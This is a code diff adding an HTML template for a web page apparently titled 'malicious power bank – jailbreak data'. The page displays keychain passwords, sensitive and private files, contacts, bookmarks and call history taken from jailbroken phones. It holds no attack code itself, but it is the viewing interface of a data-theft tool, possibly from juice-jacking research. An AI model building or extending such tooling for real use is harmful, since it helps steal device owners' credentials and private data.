@@ -1,0 +1,175 @@
+{% extends "base.html" %}
+{% block meta %}
+{% end %}
+
+{% block title %}恶意充电宝－越狱数据{% end %}
+
+{% block pagecss %}{% end %}
+{% block pagejs_before %}
+
+{% end %}
+
+{% block body %}
+<div id="main">
+    <div class="inner-title">
+        <span class="font-green select-phone">{{ param["cur"] }}</span> <span> &gt; </span><span class="active-nav">越狱数据</span>
+    </div>
+    <div class="inner-cont">
+	  	<table class="tbl" id="jailTbl">
+	     <tbody>
+
+	     </tbody>
+	   </table>
+    </div>
+</div>
+<script type="text/html" id="jailTmpl">
+	  {if(opts.flag=="0" || opts.flag==0)}
+        <tr class="main-tr"><td colspan="2" class="nodata">暂无数据</td></tr>
+    {else}
+		  {if(opts.records.keychain_data.length>0)}
+	    	<tr class="main-tr tr-file" data-md5="{=opts.records.keychain_data[0].md5}">
+	        <td title="keychain_data" colspan="2">keychain_data</td>
+		    </tr>
+	    {/if}
+      <tr class="main-tr">
+          <td title="ifuse_root">敏感数据 (共{=opts.records.db.length}个文件)</td>
+          {if(opts.records.db.length>0)}
+          <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+          <tr class="link hide">
+            <td colspan="2">
+              <div class="inner-table-cont">
+                <table class="tbl">
+                  {for(var i=0; i<opts.records.db.length; i++)}
+                  <tr class="main-tr tr-file" data-md5="{=opts.records.db[i].md5}">
+                      <td title="{=opts.records.db[i].filename}">{=opts.records.db[i].filename}</td>
+                  </tr>
+                  {/for}
+                </table>
+            </div>
+          </td>
+        </tr>
+          {else}
+          <td></td></tr>
+          {/if}
+	    <tr class="main-tr">
+	        <td title="ifuse_root">隐私数据 (共{=opts.records.ifuse_root.length}个文件)</td>
+	        {if(opts.records.ifuse_root.length>0)}
+	        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+	        <tr class="link hide">
+		        <td colspan="2">
+			        <div class="inner-table-cont">
+				        <table class="tbl">
+					        {for(var i=0; i<opts.records.ifuse_root.length; i++)}
+					        <tr class="main-tr tr-file" data-md5="{=opts.records.ifuse_root[i].md5}">
+					            <td title="{=opts.records.ifuse_root[i].filename}">{=opts.records.ifuse_root[i].filename}</td>
+					        </tr>
+					        {/for}
+				        </table>
+				    </div>
+		    	</td>
+		    </tr>
+	        {else}
+	        <td></td></tr>
+	        {/if}
+	    {/if}
+</script>
+<script type="text/html" id="jailBreakTmpl">
+	<table class="tbl">
+	 	<thead>
+              <tr>
+                  <th><span>服务</span></th>
+                  <th><span>账号</span></th>
+                  <th><span>所属组</span></th>
+                  <th><span>密码</span></th>
+              </tr>
+          </thead>
+          <tbody>
+              {if(opts.length==0)}
+                   <tr class="main-tr"><td class="nodata" colspan="4">暂无数据</td></tr>
+               {/if}
+              {for(var i=0; i<opts.length; i++)}
+                <tr class="main-tr">
+                    <td title="{=opts[i].Service}">{=opts[i].Service}</td>
+                    <td title="{=opts[i].Account}">{=opts[i].Account}</td>
+                    <td title="{=opts[i].EntitlementGroup}">{=opts[i].EntitlementGroup}</td>
+                    <td title="{=opts[i].KeychainData}">{=opts[i].KeychainData}</td>
+                </tr>
+              {/for}
+          </tbody>
+	</table>
+</script>
+<script type="text/html" id="recentTmpl">
+	<table class="tbl">
+     	<thead>
+              <tr>
+                  <th><span>类型</span></th>
+                  <th><span>姓名</span></th>
+                  <th><span>地址</span></th>
+                  <th><span>时间</span></th>
+              </tr>
+          </thead>
+          <tbody>
+              {if(opts.length==0)}
+                   <tr class="main-tr"><td class="nodata" colspan="4">暂无数据</td></tr>
+               {/if}
+              {for(var i=0; i<opts.length; i++)}
+                <tr class="main-tr">
+                    <td title="{=opts[i].bundle_identify}">{=opts[i].bundle_identify}</td>
+                    <td title="{=opts[i].display_name}">{=opts[i].display_name}</td>
+                    <td title="{=opts[i].address}">{=opts[i].address}</td>
+                    <td title="{=opts[i].date}">{=opts[i].date}</td>
+                </tr>
+              {/for}
+     </tbody>
+   </table>
+</script>
+<script type="text/html" id="bookmarksTmpl">
+	<table class="tbl">
+     	<thead>
+              <tr>
+                  <th><span>标题</span></th>
+                  <th><span>链接</span></th>
+              </tr>
+          </thead>
+          <tbody>
+              {if(opts.length==0)}
+                   <tr class="main-tr"><td class="nodata" colspan="2">暂无数据</td></tr>
+               {/if}
+              {for(var i=0; i<opts.length; i++)}
+                <tr class="main-tr">
+                    <td title="{=opts[i].title}">{=opts[i].title}</td>
+                    <td title="{=opts[i].url}">{=opts[i].url}</td>
+                </tr>
+              {/for}
+     </tbody>
+   </table>
+</script>
+<script type="text/html" id="historyTmpl">
+	<table class="tbl">
+     	<thead>
+              <tr>
+                  <th><span>号码</span></th>
+                  <th><span>日期</span></th>
+                  <th><span>状态</span></th>
+              </tr>
+          </thead>
+          <tbody>
+              {if(opts.length==0)}
+                   <tr class="main-tr"><td class="nodata" colspan="3">暂无数据</td></tr>
+               {/if}
+              {for(var i=0; i<opts.length; i++)}
+                <tr class="main-tr">
+                    <td title="{=opts[i].address}">{=opts[i].address}</td>
+					 <td title="{=opts[i].date}">{=opts[i].date}</td>
+					 <td title="{=opts[i].type}">{=opts[i].type}</td>
+                </tr>
+              {/for}
+     </tbody>
+   </table>
+</script>
+
+{% end %}
+
+{% block pagejs %}
+ <script src="/static/js/page/jail.js" type="text/javascript"></script>
+{% end %}
